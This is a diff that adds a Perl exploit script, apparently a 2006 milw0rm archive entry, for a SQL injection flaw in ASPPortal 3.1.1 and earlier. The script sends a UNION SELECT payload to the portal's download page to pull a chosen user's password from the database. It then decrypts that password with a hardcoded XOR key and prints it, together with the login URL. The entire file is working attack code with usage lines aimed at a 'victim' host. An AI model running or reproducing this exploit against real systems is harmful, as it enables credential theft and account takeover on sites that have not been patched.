@@ -1,0 +1,87 @@
+#!/usr/bin/perl
+#Method found & Exploit scripted by nukedx
+#Contacts > ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com
+#Original advisory: http://www.nukedx.com/?viewdoc=21
+#Usage: aspp.pl <host> <path> <user>
+use IO::Socket;
+use Math::BigInt;
+if(@ARGV != 3) { usage(); }
+else { exploit(); }
+sub header()
+{
+  print "\n- NukedX Security Advisory Nr.2006-21\r\n";
+  print "- ASPPortal <= 3.1.1 Remote SQL Injection Exploit\r\n";
+}
+sub usage() 
+{
+  header();
+  print "- Usage: $0 <host> <path> <user>\r\n";
+  print "- <host> -> Victim's host ex: www.victim.com\r\n";
+  print "- <path> -> Path to ASPPortal  ex: /portal/\r\n";
+  print "- <user> -> Username that you want password. ex: admin\r\n";
+  exit();
+}
+sub decrypt ()
+{
+  $lp = length($appass);
+  $apkey = "IY/;\$>=3)?^-+7M32#Q]VOII.Q=OFMC`:P7_B;<R/8U)XFHC<SR_E\$.DLG'=I+@5%*+OP:F_=';'NSY`-^S.`AA=BJ3M0.WF#T5LGK(=/<:+C2K/^7AI\$;PU'OME2+T8ND?W\$C(J\,;631'M-LD5F%%1TF_&K2A-D-54[2P,#'*JU%6`0RF3CMF0(#T07U'FZ=>#,+.AW_/+']DIB;2DTIA57TT&-)O'/*F'M>H.XH5W^0Y*=71+5*^`^PKJ(=E/X#7A:?,S>R&T;+B#<:-*\@)X9F`_`%QA3Z95.?_T#1,\$2#FWW5PBH^*<])A(S0@AVD8C^Q0R^T1D?(1+,YE71X+.*+U\$:3XO^Q].KG&0N0];[LJ<OZ6IN?7N4<GTL?(M'4S8+3JMK5]HC%^1^+K;\\$WBXPA?F&5^E\D\$7%*O/U[1/?8(5:1OVWV*1Z-%`:K&V?X1,1KURD@3W0^D)<OG40?(VJ4EWL5A5M<\$A);CQ36R9I]*U#Q%1<Y\&SA%#1<V";
+  if ($lp == 0) { die("- An error occurued\r\n"); }
+  for ($i = 0; $i < $lp ; $i++) {
+    $f = $lp - $i - 1; # Formula for getting character via substr...
+    $n = substr($apkey,$f,1);
+    $l = substr($appass,$f,1);
+    $appwd = chr(ord($n)^ord($l)).$appwd;
+  }
+  print "- Password decrypted as: $appwd\r\n";
+  print "- Lets go $aphost$apdir$apfinal for login\r\n";
+  exit();
+}
+sub exploit () 
+{
+  #Our variables...
+  $apserver = $ARGV[0];
+  $apserver =~ s/(http:\/\/)//eg;
+  $aphost   = "http://".$apserver;
+  $apdir    = $ARGV[1];
+  $apport   = "80";
+  $aptar    = "content/downloads/download_click.asp?downloadid=";
+  $apfinal  = "content/users/login.asp";
+  $apxp     = "-1+UNION+SELECT+0,0,0,0,0,0,0,0,0,0,password+FROM+users+where+username='$ARGV[2]'";
+  $apreq    = $aphost.$apdir.$aptar.$apxp;
+  #Sending data...
+  header();
+  print "- Trying to connect: $apserver\r\n";
+  $ap = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$apserver", PeerPort => "$apport") || die "- Connection failed...\n";
+  print $ap "GET $apreq HTTP/1.1\n";
+  print $ap "Accept: */*\n";
+  print $ap "Referer: $aphost\n";
+  print $ap "Accept-Language: tr\n";
+  print $ap "User-Agent: NukeZilla\n";
+  print $ap "Cache-Control: no-cache\n";
+  print $ap "Host: $apserver\n";
+  print $ap "Connection: close\n\n";
+  print "- Connected...\r\n";
+  while ($answer = <$ap>) {
+    if ($answer =~ /string: &quot;(.*?)&quot;]'/) {
+      print "- Exploit succeed! Getting $ARGV[2]'s information\r\n";
+      print "- Username: $ARGV[2]\r\n";
+      print "- Decrypting password....\r\n";
+      $appass = $1;
+      $appass =~ s/(&quot;)/chr(34)/eg;
+      $appass =~ s/(&lt;)/chr(60)/eg;
+      $appass =~ s/(&gt;)/chr(62)/eg;
+      $appass =~ s/(&nbsp;)/chr(32)/eg;
+      decrypt();
+    }
+    if ($answer =~ /number of columns/) { 
+      print "- This version of ASPPortal is vulnerable too\r\n";
+      print "- but default query of SQL-Inj. does not work on it\r\n";
+      print "- So please edit query by manually adding null data..\r\n";
+      exit(); 
+    }
+  }
+  #Exploit failed...
+  print "- Exploit failed\n"
+}
+
+# milw0rm.com [2006-03-20]
